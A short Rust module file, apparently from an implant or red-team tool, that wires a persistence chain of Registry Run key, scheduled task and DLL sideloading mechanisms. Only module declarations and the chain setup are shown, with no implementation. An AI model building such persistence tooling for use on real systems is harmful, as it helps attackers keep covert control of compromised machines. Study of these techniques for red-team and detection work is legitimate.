use crate::persistence::PersistenceChain;
pub mod dll_sideload;
pub mod registry;
pub mod scheduled_task;

pub fn get_chain() -> PersistenceChain {
    PersistenceChain::new(vec![
        Box::new(registry::RegistryRunPersistence),
        Box::new(scheduled_task::ScheduledTaskPersistence),
        Box::new(dll_sideload::DllSideloadPersistence),
    ])
}
